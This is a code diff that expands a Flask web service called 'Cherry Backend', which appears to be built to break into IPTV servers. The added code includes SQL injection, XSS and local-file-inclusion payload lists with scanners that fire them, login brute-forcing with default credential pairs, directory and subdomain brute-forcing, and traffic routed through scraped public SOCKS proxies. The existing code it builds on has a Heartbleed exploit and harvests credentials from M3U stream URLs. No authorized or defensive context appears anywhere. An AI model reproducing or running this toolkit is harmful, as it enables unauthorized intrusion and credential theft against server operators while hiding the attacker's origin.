@@ -21,6 +21,13 @@ import struct
 from urllib.parse import urlparse, urljoin, parse_qs
 from collections import deque
 
+# Intentar importar pysocks para soporte SOCKS
+try:
+    import socks
+    SOCKS_AVAILABLE = True
+except ImportError:
+    SOCKS_AVAILABLE = False
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
@@ -28,13 +35,81 @@ CORS(app)
 
 # ===== CONFIGURACIÓN =====
 TIMEOUT = 3
-MAX_WORKERS = 20  # Reducido para Render gratis
-BASE_DIR = "/tmp/cherry_data"  # Render solo permite escribir en /tmp
+MAX_WORKERS = 20
+BASE_DIR = "/tmp/cherry_data"
 os.makedirs(BASE_DIR, exist_ok=True)
 os.makedirs(f"{BASE_DIR}/logs", exist_ok=True)
 os.makedirs(f"{BASE_DIR}/complete", exist_ok=True)
 os.makedirs(f"{BASE_DIR}/hits", exist_ok=True)
 os.makedirs(f"{BASE_DIR}/combo", exist_ok=True)
+
+# ===== NETWORK INTERCEPTOR =====
+class NetworkInterceptor:
+    def __init__(self):
+        self.connections = []
+        self.ips = set()
+        self.lock = threading.Lock()
+    
+    def capture(self, host, port, protocol="tcp"):
+        conn = f"{host}:{port}"
+        with self.lock:
+            if conn not in self.connections:
+                self.connections.append(conn)
+                self.ips.add(host)
+                return True
+        return False
+    
+    def get_stats(self):
+        with self.lock:
+            return {
+                'connections': self.connections[-50:],
+                'unique_ips': list(self.ips)[-20:],
+                'total': len(self.connections)
+            }
+
+network_interceptor = NetworkInterceptor()
+
+# Hook para capturar conexiones socket
+original_socket_connect = socket.socket.connect
+def hooked_connect(self, *args, **kwargs):
+    try:
+        if args:
+            host, port = args[0]
+            network_interceptor.capture(host, port)
+    except:
+        pass
+    return original_socket_connect(self, *args, **kwargs)
+socket.socket.connect = hooked_connect
+
+# ===== SISTEMA DE LOGS =====
+class Logger:
+    def __init__(self, target):
+        self.target = target
+        self.log_dir = f"{BASE_DIR}/logs/{target.replace('/', '_')}"
+        os.makedirs(self.log_dir, exist_ok=True)
+        self.handlers = {}
+    
+    def get_handler(self, name):
+        if name not in self.handlers:
+            self.handlers[name] = open(f"{self.log_dir}/{name}.log", 'a', encoding='utf-8')
+        return self.handlers[name]
+    
+    def write(self, category, message):
+        handler = self.get_handler(category)
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        handler.write(f"[{timestamp}] {message}\n")
+        handler.flush()
+    
+    def close_all(self):
+        for h in self.handlers.values():
+            h.close()
+
+current_logger = None
+
+def set_current_logger(target):
+    global current_logger
+    current_logger = Logger(target)
+    return current_logger
 
 # ===== PUERTOS IPTV COMPLETOS =====
 IPTV_PORTS = [
@@ -72,7 +147,22 @@ IPTV_ENDPOINTS = [
     '/livetv/', '/tv/', '/radio/'
 ]
 
-# ===== CREDENCIALES COMUNES =====
+# ===== LISTA DE DIRECTORIOS PARA FUERZA BRUTA =====
+DIRECTORY_LIST = [
+    '/admin', '/panel', '/cpanel', '/login', '/wp-admin', '/manager',
+    '/phpmyadmin', '/phpPgAdmin', '/mysql', '/sql', '/backup', '/backups',
+    '/dump', '/dumps', '/db', '/.git', '/.env', '/.svn', '/config',
+    '/configuration', '/settings', '/api', '/v1', '/v2', '/v3',
+    '/user', '/users', '/account', '/accounts', '/profile', '/profiles',
+    '/admin.php', '/panel.php', '/login.php', '/user.php', '/users.php',
+    '/server-status', '/server-info', '/info.php', '/phpinfo.php',
+    '/xmlrpc.php', '/wp-login.php', '/wp-content', '/wp-includes',
+    '/joomla', '/administrator', '/components', '/modules',
+    '/drupal', '/sites', '/sites/default', '/sites/all',
+    '/cgi-bin', '/cgi-bin/status', '/cgi-bin/test.cgi'
+]
+
+# ===== CREDENCIALES COMUNES PARA FUERZA BRUTA =====
 COMMON_CREDS = [
     ('admin', 'admin'), ('admin', '1234'), ('admin', 'password'),
     ('admin', '123456'), ('admin', 'admin123'), ('admin', '12345'),
@@ -82,7 +172,51 @@ COMMON_CREDS = [
     ('administrator', 'administrator'), ('guest', 'guest'),
     ('support', 'support'), ('ftp', 'ftp'), ('mysql', 'mysql'),
     ('postgres', 'postgres'), ('oracle', 'oracle'), ('tomcat', 'tomcat'),
-    ('manager', 'manager'), ('supervisor', 'supervisor')
+    ('manager', 'manager'), ('supervisor', 'supervisor'),
+    ('admin', '123456789'), ('admin', 'qwerty'), ('admin', 'abc123'),
+    ('root', '123456'), ('root', 'qwerty'), ('user', 'password')
+]
+
+# ===== PAYLOADS PARA SQL INJECTION =====
+SQLI_PAYLOADS = [
+    "'", "\"", "';", "\";", "' OR '1'='1", "\" OR \"1\"=\"1",
+    "' OR 1=1--", "\" OR 1=1--", "' OR '1'='1'--", "admin'--",
+    "1' AND '1'='1", "1' AND '1'='2", "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--"
+]
+
+# ===== PAYLOADS PARA XSS =====
+XSS_PAYLOADS = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "javascript:alert(1)",
+    "\"><script>alert(1)</script>",
+    "'><script>alert(1)</script>",
+    "<ScRiPt>alert(1)</ScRiPt>"
+]
+
+# ===== PAYLOADS PARA LFI/RFI =====
+LFI_PAYLOADS = [
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\win.ini",
+    "../../../../etc/passwd",
+    "....//....//....//etc/passwd",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "/proc/self/environ",
+    "/proc/self/cmdline"
+]
+
+# ===== SUBDOMINIOS COMUNES =====
+COMMON_SUBDOMAINS = [
+    'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop',
+    'ns1', 'ns2', 'ns3', 'dns', 'dns1', 'dns2', 'dns3',
+    'cpanel', 'whm', 'webdisk', 'webdav', 'blog', 'shop', 'store',
+    'api', 'api1', 'api2', 'api3', 'dev', 'development', 'stage',
+    'test', 'testing', 'demo', 'admin', 'administrator', 'panel',
+    'secure', 'vpn', 'remote', 'server', 'mailserver', 'mx',
+    'email', 'imap', 'smtp', 'pop3', 'web', 'www2', 'www3',
+    'forum', 'chat', 'help', 'support', 'helpdesk', 'ticket'
 ]
 
 # ===== FUNCIÓN DE GEOLOCALIZACIÓN =====
@@ -123,27 +257,73 @@ def get_ip_location(ip: str) -> dict:
         'org': ''
     }
 
-# ===== FUNCIÓN PARA OBTENER PROXYS GRATIS =====
-def get_free_proxies():
-    proxies = []
-    sources = [
-        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000",
-        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
-    ]
-    for url in sources:
-        try:
-            r = requests.get(url, timeout=5)
-            if r.status_code == 200:
-                for line in r.text.strip().split('\n'):
-                    proxy = line.strip()
-                    if ':' in proxy:
-                        proxies.append(proxy)
-                        if len(proxies) >= 30:
-                            break
-        except:
-            continue
-    return list(set(proxies))[:20]
+# ===== FUNCIÓN PARA OBTENER PROXYS GRATIS (HTTP + SOCKS) =====
+def get_free_proxies(proxy_type='all'):
+    proxies = {'http': [], 'socks4': [], 'socks5': []}
+    
+    sources = {
+        'http': [
+            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000",
+            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
+        ],
+        'socks4': [
+            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000",
+            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt"
+        ],
+        'socks5': [
+            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000",
+            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
+        ]
+    }
+    
+    types_to_fetch = ['http', 'socks4', 'socks5'] if proxy_type == 'all' else [proxy_type]
+    
+    for pt in types_to_fetch:
+        for url in sources.get(pt, []):
+            try:
+                r = requests.get(url, timeout=5)
+                if r.status_code == 200:
+                    for line in r.text.strip().split('\n'):
+                        proxy = line.strip()
+                        if ':' in proxy:
+                            proxies[pt].append(proxy)
+                            if len(proxies[pt]) >= 20:
+                                break
+            except:
+                continue
+    
+    return {
+        'http': list(set(proxies['http']))[:20],
+        'socks4': list(set(proxies['socks4']))[:20],
+        'socks5': list(set(proxies['socks5']))[:20]
+    }
+
+def get_proxy_connection(proxy_type, proxy_host, proxy_port, target_host, target_port, username=None, password=None):
+    """Obtiene una conexión socket a través de proxy SOCKS/HTTP"""
+    if proxy_type in ['socks4', 'socks5'] and SOCKS_AVAILABLE:
+        s = socks.socksocket()
+        if proxy_type == 'socks5':
+            s.set_proxy(socks.SOCKS5, proxy_host, int(proxy_port), username=username, password=password)
+        else:
+            s.set_proxy(socks.SOCKS4, proxy_host, int(proxy_port), username=username)
+        s.connect((target_host, int(target_port)))
+        return s
+    elif proxy_type == 'http':
+        # HTTP CONNECT tunnel
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((proxy_host, int(proxy_port)))
+        connect_req = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n\r\n"
+        s.send(connect_req.encode())
+        response = s.recv(1024).decode()
+        if '200' in response:
+            return s
+        s.close()
+        raise Exception("HTTP CONNECT failed")
+    else:
+        # Conexión directa
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_host, int(target_port)))
+        return s
 
 # ===== FUNCIONES DE UTILIDAD =====
 def get_service_name(port):
@@ -157,24 +337,33 @@ def get_service_name(port):
     }
     return services.get(port, f'Port-{port}')
 
-def grab_banner(host, port):
+def grab_banner(host, port, proxy_info=None):
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(2)
-        sock.connect((host, port))
+        if proxy_info:
+            s = get_proxy_connection(
+                proxy_info.get('type', 'direct'),
+                proxy_info.get('host', ''),
+                proxy_info.get('port', 0),
+                host, port
+            )
+        else:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
+            s.connect((host, port))
+        
         if port in [21, 25, 110, 143, 443, 993, 995, 22]:
-            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
+            banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
         elif port in [80, 443, 8080, 8443, 25461, 25462, 25463]:
-            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
-            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
+            s.send(b"HEAD / HTTP/1.0\r\n\r\n")
+            banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
         else:
             banner = ""
-        sock.close()
+        s.close()
         return banner[:200]
     except:
         return ""
 
-# ===== EXPLOITS REALES (de ULTIMATE_HOST) =====
+# ===== EXPLOITS REALES =====
 def check_ftp_vulnerabilities(host, port=21):
     results = {'anonymous': False, 'creds': []}
     try:
@@ -256,7 +445,7 @@ def check_iptv_vulnerabilities(host, port):
                 continue
     return results
 
-# ===== HEARTBLEED EXPLOIT (de ULTIMATE_HOST) =====
+# ===== HEARTBLEED EXPLOIT =====
 hello = bytes.fromhex('''
 16 03 02 00 dc 01 00 00 d8 03 02 53
 43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf
@@ -340,7 +529,7 @@ def check_heartbleed(host, port):
         
         if server_version is None:
             s.close()
-            return False
+            return {'vulnerable': False, 'error': 'No Server Hello'}
         
         s.send(hb)
         msg_type, version, payload = receive_message(s)
@@ -362,18 +551,20 @@ def sni_bruteforce(host, port=443, sni_list=None):
         sni_list = [
             "iptv.live", "panel.tv", "xui.com", "live-stream.net",
             "access.iptv", "client.xui", "userpanel.pro", "tvserver.world",
-            "xtream-codes.com", "iptv-provider.com", "streaming-server.com"
+            "xtream-codes.com", "iptv-provider.com", "streaming-server.com",
+            "www.google.com", "www.cloudflare.com", "www.amazon.com",
+            "api.cloudflare.com", "api.google.com", "ssl.google.com"
         ]
     
     results = []
-    for sni in sni_list[:5]:  # Limitar a 5 SNIs
+    for sni in sni_list[:10]:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(5)
             sock.connect((host, port))
             
-            # Construir ClientHello con SNI (simplificado)
-            client_hello = hello  # Usar el mismo hello de heartbleed
+            # Construir ClientHello con SNI
+            client_hello = hello
             sock.send(client_hello)
             
             readable, _, _ = select.select([sock], [], [], 2)
@@ -404,6 +595,7 @@ def extract_from_m3u(url):
         
         content = r.text
         credentials = []
+        categories = []
         
         # Buscar credenciales en la URL
         parsed = urlparse(url)
@@ -416,12 +608,14 @@ def extract_from_m3u(url):
         
         # Buscar en el contenido M3U
         lines = content.split('\n')
+        streams = 0
         for line in lines:
             if line.startswith('#EXTINF'):
-                # Buscar group-title
+                streams += 1
+                # Buscar group-title (categorías)
                 group_match = re.search(r'group-title="([^"]+)"', line)
-                if group_match:
-                    pass  # Podríamos guardar categorías
+                if group_match and group_match.group(1) not in categories:
+                    categories.append(group_match.group(1))
             elif line and not line.startswith('#') and ('http://' in line or 'https://' in line):
                 # Es una URL de stream, podría contener credenciales
                 stream_url = line.strip()
@@ -431,14 +625,17 @@ def extract_from_m3u(url):
                     username = params.get('username', [''])[0] or params.get('user', [''])[0]
                     password = params.get('password', [''])[0] or params.get('pass', [''])[0]
                     if username and password:
-                        credentials.append({'username': username, 'password': password})
+                        cred = {'username': username, 'password': password}
+                        if cred not in credentials:
+                            credentials.append(cred)
         
         return {
             'success': True,
             'server_url': f"{parsed.scheme}://{parsed.netloc}",
             'server_ip': socket.gethostbyname(parsed.hostname),
-            'credentials': list({(c['username'], c['password']): c for c in credentials}.values()),
-            'streams_count': len([l for l in lines if l and not l.startswith('#')])
+            'credentials': credentials,
+            'streams_count': streams,
+            'categories': categories[:20]
         }
     except Exception as e:
         return {'success': False, 'error': str(e)}
@@ -490,7 +687,7 @@ def find_mirrors(host):
         ip = socket.gethostbyname(host)
         
         # Escanear puertos comunes en la misma IP
-        common_ports = [80, 443, 8080, 8443, 8888, 25461, 25462]
+        common_ports = [80, 443, 8080, 8443, 8888, 25461, 25462, 21, 22, 3306]
         for port in common_ports:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(1)
@@ -500,18 +697,208 @@ def find_mirrors(host):
             sock.close()
         
         # Buscar subdominios comunes
-        subdomains = ['www', 'cpanel', 'panel', 'admin', 'server', 'ns1', 'ns2']
-        for sub in subdomains:
+        for sub in COMMON_SUBDOMAINS[:20]:
             try:
-                sub_ip = socket.gethostbyname(f"{sub}.{host}")
+                subdomain = f"{sub}.{host}"
+                sub_ip = socket.gethostbyname(subdomain)
                 if sub_ip != ip:
-                    mirrors.append({'host': f"{sub}.{host}", 'ip': sub_ip, 'port': 80, 'service': 'HTTP'})
+                    # Escanear puertos en el subdominio
+                    for port in [80, 443]:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(1)
+                        if sock.connect_ex((sub_ip, port)) == 0:
+                            mirrors.append({
+                                'host': subdomain,
+                                'ip': sub_ip,
+                                'port': port,
+                                'service': 'HTTP' if port == 80 else 'HTTPS'
+                            })
+                        sock.close()
             except:
-                pass
+                continue
         
-        return {'success': True, 'mirrors': mirrors[:10]}
+        return {'success': True, 'mirrors': mirrors[:20]}
     except Exception as e:
         return {'success': False, 'error': str(e)}
+
+# ===== FUERZA BRUTA DE DIRECTORIOS =====
+def brute_force_directories(host, port=80, ssl=False):
+    protocol = 'https' if ssl else 'http'
+    base_url = f"{protocol}://{host}:{port}"
+    results = []
+    
+    def check_path(path):
+        url = base_url + path
+        try:
+            r = requests.get(url, timeout=3, verify=False)
+            if r.status_code in [200, 301, 302, 401, 403]:
+                return {
+                    'path': path,
+                    'status': r.status_code,
+                    'url': url,
+                    'size': len(r.text)
+                }
+        except:
+            pass
+        return None
+    
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = {executor.submit(check_path, path): path for path in DIRECTORY_LIST}
+        for future in futures:
+            result = future.result()
+            if result:
+                results.append(result)
+    
+    return results
+
+# ===== FUERZA BRUTA DE LOGIN =====
+def brute_force_login(host, port=80, ssl=False, login_path='/login.php', username_field='username', password_field='password'):
+    protocol = 'https' if ssl else 'http'
+    login_url = f"{protocol}://{host}:{port}{login_path}"
+    results = []
+    
+    def try_login(username, password):
+        try:
+            data = {username_field: username, password_field: password}
+            r = requests.post(login_url, data=data, timeout=3, verify=False, allow_redirects=False)
+            
+            # Detectar éxito por código o redirección
+            if r.status_code == 302 or r.status_code == 200 and ('dashboard' in r.text.lower() or 'welcome' in r.text.lower()):
+                return {'username': username, 'password': password, 'success': True}
+        except:
+            pass
+        return None
+    
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = {executor.submit(try_login, u, p): (u, p) for u, p in COMMON_CREDS[:30]}
+        for future in futures:
+            result = future.result()
+            if result:
+                results.append(result)
+    
+    return results
+
+# ===== SQL INJECTION SCANNER =====
+def scan_sql_injection(host, port=80, ssl=False, path='/', param='id'):
+    protocol = 'https' if ssl else 'http'
+    base_url = f"{protocol}://{host}:{port}{path}"
+    results = []
+    
+    def test_payload(payload):
+        try:
+            url = f"{base_url}?{param}={payload}"
+            r = requests.get(url, timeout=3, verify=False)
+            
+            # Detectar errores SQL
+            if 'mysql_fetch' in r.text.lower() or 'sql' in r.text.lower() or 'database error' in r.text.lower():
+                return {'payload': payload, 'vulnerable': True, 'evidence': 'SQL error detected'}
+            
+            # Comparar con respuesta normal
+            normal = requests.get(f"{base_url}?{param}=1", timeout=3, verify=False)
+            if len(r.text) != len(normal.text):
+                return {'payload': payload, 'vulnerable': True, 'evidence': 'Content length difference'}
+        except:
+            pass
+        return None
+    
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        futures = {executor.submit(test_payload, p): p for p in SQLI_PAYLOADS}
+        for future in futures:
+            result = future.result()
+            if result:
+                results.append(result)
+    
+    return results
+
+# ===== XSS SCANNER =====
+def scan_xss(host, port=80, ssl=False, path='/', param='q'):
+    protocol = 'https' if ssl else 'http'
+    base_url = f"{protocol}://{host}:{port}{path}"
+    results = []
+    
+    def test_payload(payload):
+        try:
+            url = f"{base_url}?{param}={payload}"
+            r = requests.get(url, timeout=3, verify=False)
+            
+            # Verificar si el payload se refleja sin filtrar
+            if payload in r.text and '<' in payload and '>' in payload:
+                return {'payload': payload, 'vulnerable': True, 'evidence': 'Payload reflected'}
+        except:
+            pass
+        return None
+    
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        futures = {executor.submit(test_payload, p): p for p in XSS_PAYLOADS}
+        for future in futures:
+            result = future.result()
+            if result:
+                results.append(result)
+    
+    return results
+
+# ===== LFI SCANNER =====
+def scan_lfi(host, port=80, ssl=False, path='/', param='file'):
+    protocol = 'https' if ssl else 'http'
+    base_url = f"{protocol}://{host}:{port}{path}"
+    results = []
+    
+    def test_payload(payload):
+        try:
+            url = f"{base_url}?{param}={payload}"
+            r = requests.get(url, timeout=3, verify=False)
+            
+            # Verificar si se muestran archivos del sistema
+            if 'root:' in r.text or '[extensions]' in r.text or 'boot loader' in r.text:
+                return {'payload': payload, 'vulnerable': True, 'evidence': 'System file detected'}
+        except:
+            pass
+        return None
+    
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        futures = {executor.submit(test_payload, p): p for p in LFI_PAYLOADS}
+        for future in futures:
+            result = future.result()
+            if result:
+                results.append(result)
+    
+    return results
+
+# ===== DNS SCAN =====
+def dns_scan(domains):
+    results = []
+    with ThreadPoolExecutor(max_workers=20) as executor:
+        def resolve(domain):
+            try:
+                ip = socket.gethostbyname(domain)
+                location = get_ip_location(ip)
+                return {
+                    'domain': domain,
+                    'ip': ip,
+                    'location': location['location'],
+                    'flag': location['country_flag']
+                }
+            except:
+                return {'domain': domain, 'ip': None, 'error': 'DNS failed'}
+        
+        futures = {executor.submit(resolve, d): d for d in domains[:50]}
+        for future in futures:
+            result = future.result(timeout=5)
+            results.append(result)
+    
+    return results
+
+# ===== SUBDOMAIN SCAN =====
+def subdomain_scan(domain):
+    results = []
+    for sub in COMMON_SUBDOMAINS:
+        try:
+            subdomain = f"{sub}.{domain}"
+            ip = socket.gethostbyname(subdomain)
+            results.append({'subdomain': subdomain, 'ip': ip})
+        except:
+            continue
+    return results
 
 # ===== ESCANEO PRINCIPAL =====
 def scan_port(host, port):
@@ -569,7 +956,23 @@ def health():
         'status': 'ok',
         'version': '5.0 - COMPLETE EDITION',
         'ports_available': len(IPTV_PORTS),
-        'message': '🔥 CHERRY BACKEND CON TODOS LOS EXPLOITS'
+        'features': {
+            'heartbleed': True,
+            'm3u': True,
+            'sni': True,
+            'mirrors': True,
+            'directory_bruteforce': True,
+            'login_bruteforce': True,
+            'sqli': True,
+            'xss': True,
+            'lfi': True,
+            'dns_scan': True,
+            'subdomain_scan': True,
+            'socks_proxy': SOCKS_AVAILABLE,
+            'network_interceptor': True,
+            'logging': True
+        },
+        'message': '🔥 CHERRY BACKEND - ULTIMATE COMPLETE EDITION'
     })
 
 @app.route('/api/scan', methods=['POST'])
@@ -595,6 +998,10 @@ def scan():
     else:
         port_list = IPTV_PORTS[:30]
     
+    # Iniciar logger
+    logger = set_current_logger(host)
+    logger.write('scan', f"Iniciando escaneo de {host} con {len(port_list)} puertos")
+    
     results = []
     batch_size = 5
     for i in range(0, len(port_list), batch_size):
@@ -603,13 +1010,19 @@ def scan():
             futures = {executor.submit(scan_port, host, p): p for p in batch}
             for future in futures:
                 try:
-                    results.append(future.result(timeout=TIMEOUT+2))
+                    result = future.result(timeout=TIMEOUT+2)
+                    results.append(result)
+                    if result.get('open'):
+                        logger.write('scan', f"Puerto {result['port']} abierto - {result['service']}")
                 except:
                     results.append({'port': futures[future], 'open': False})
     
     open_ports = [r for r in results if r.get('open')]
     vulnerable = [r for r in results if r.get('vulnerable')]
     location = get_ip_location(host)
+    
+    logger.write('scan', f"Escaneo completado. {len(open_ports)} abiertos, {len(vulnerable)} vulnerables")
+    logger.close_all()
     
     return jsonify({
         'host': host,
@@ -723,7 +1136,6 @@ def m3u_server():
     if not url:
         return jsonify({'error': 'URL requerida'}), 400
     
-    # Similar a m3u_process pero con más detalles
     result = extract_from_m3u(url)
     return jsonify(result)
 
@@ -736,14 +1148,115 @@ def mirrors():
     result = find_mirrors(host)
     return jsonify(result)
 
+@app.route('/api/bruteforce/directories', methods=['POST'])
+def bruteforce_directories():
+    data = request.json
+    host = data.get('host')
+    port = data.get('port', 80)
+    ssl = data.get('ssl', False)
+    
+    if not host:
+        return jsonify({'error': 'Host requerido'}), 400
+    
+    results = brute_force_directories(host, int(port), ssl)
+    return jsonify({'success': True, 'results': results, 'count': len(results)})
+
+@app.route('/api/bruteforce/login', methods=['POST'])
+def bruteforce_login():
+    data = request.json
+    host = data.get('host')
+    port = data.get('port', 80)
+    ssl = data.get('ssl', False)
+    login_path = data.get('login_path', '/login.php')
+    username_field = data.get('username_field', 'username')
+    password_field = data.get('password_field', 'password')
+    
+    if not host:
+        return jsonify({'error': 'Host requerido'}), 400
+    
+    results = brute_force_login(host, int(port), ssl, login_path, username_field, password_field)
+    return jsonify({'success': True, 'results': results, 'count': len(results)})
+
+@app.route('/api/scanner/sqli', methods=['POST'])
+def scan_sqli():
+    data = request.json
+    host = data.get('host')
+    port = data.get('port', 80)
+    ssl = data.get('ssl', False)
+    path = data.get('path', '/')
+    param = data.get('param', 'id')
+    
+    if not host:
+        return jsonify({'error': 'Host requerido'}), 400
+    
+    results = scan_sql_injection(host, int(port), ssl, path, param)
+    return jsonify({'success': True, 'results': results, 'count': len(results)})
+
+@app.route('/api/scanner/xss', methods=['POST'])
+def scan_xss_route():
+    data = request.json
+    host = data.get('host')
+    port = data.get('port', 80)
+    ssl = data.get('ssl', False)
+    path = data.get('path', '/')
+    param = data.get('param', 'q')
+    
+    if not host:
+        return jsonify({'error': 'Host requerido'}), 400
+    
+    results = scan_xss(host, int(port), ssl, path, param)
+    return jsonify({'success': True, 'results': results, 'count': len(results)})
+
+@app.route('/api/scanner/lfi', methods=['POST'])
+def scan_lfi_route():
+    data = request.json
+    host = data.get('host')
+    port = data.get('port', 80)
+    ssl = data.get('ssl', False)
+    path = data.get('path', '/')
+    param = data.get('param', 'file')
+    
+    if not host:
+        return jsonify({'error': 'Host requerido'}), 400
+    
+    results = scan_lfi(host, int(port), ssl, path, param)
+    return jsonify({'success': True, 'results': results, 'count': len(results)})
+
+@app.route('/api/dns/scan', methods=['POST'])
+def dns_scan_route():
+    data = request.json
+    domains = data.get('domains', [])
+    
+    if not domains:
+        return jsonify({'error': 'Lista de dominios requerida'}), 400
+    
+    results = dns_scan(domains)
+    return jsonify({'success': True, 'results': results, 'count': len(results)})
+
+@app.route('/api/subdomains/scan', methods=['POST'])
+def subdomains_scan():
+    data = request.json
+    domain = data.get('domain')
+    
+    if not domain:
+        return jsonify({'error': 'Dominio requerido'}), 400
+    
+    results = subdomain_scan(domain)
+    return jsonify({'success': True, 'results': results, 'count': len(results)})
+
 @app.route('/api/proxies', methods=['GET'])
 def get_proxies():
-    proxies = get_free_proxies()
+    proxy_type = request.args.get('type', 'all')
+    proxies = get_free_proxies(proxy_type)
     return jsonify({
         'proxies': proxies,
-        'count': len(proxies),
-        'source': 'public_lists'
+        'socks_available': SOCKS_AVAILABLE,
+        'message': 'SOCKS disponible' if SOCKS_AVAILABLE else 'SOCKS no disponible (instalar pysocks)'
     })
+
+@app.route('/api/interceptor/stats', methods=['GET'])
+def interceptor_stats():
+    return jsonify(network_interceptor.get_stats())
 
 @app.route('/api/clear', methods=['POST'])
 def clear():
@@ -758,14 +1271,24 @@ def clear():
         return jsonify({'success': False, 'error': str(e)})
 
 if __name__ == '__main__':
-    print("\n" + "="*70)
-    print("🍒 CHERRY BACKEND - COMPLETE EDITION")
-    print("="*70)
+    print("\n" + "="*80)
+    print("🍒 CHERRY BACKEND - ULTIMATE COMPLETE EDITION 🍒")
+    print("="*80)
     print(f"📋 Puertos configurados: {len(IPTV_PORTS)}")
     print(f"🔧 Heartbleed: ACTIVADO")
     print(f"📁 M3U Processing: ACTIVADO")
     print(f"🔍 SNI Brute-force: ACTIVADO")
     print(f"🎯 Mirrors: ACTIVADO")
+    print(f"📂 Directory Bruteforce: ACTIVADO")
+    print(f"🔐 Login Bruteforce: ACTIVADO")
+    print(f"💉 SQL Injection Scanner: ACTIVADO")
+    print(f"🖥️ XSS Scanner: ACTIVADO")
+    print(f"📁 LFI Scanner: ACTIVADO")
+    print(f"🌐 DNS Scan: ACTIVADO")
+    print(f"🕸️ Subdomain Scan: ACTIVADO")
+    print(f"🛡️ SOCKS Proxy: {'ACTIVADO' if SOCKS_AVAILABLE else 'NO DISPONIBLE (pip install pysocks)'}")
+    print(f"📡 Network Interceptor: ACTIVADO")
+    print(f"📝 Logging System: ACTIVADO")
     print(f"📂 Datos en: {BASE_DIR}")
-    print("="*70 + "\n")
+    print("="*80 + "\n")
     app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
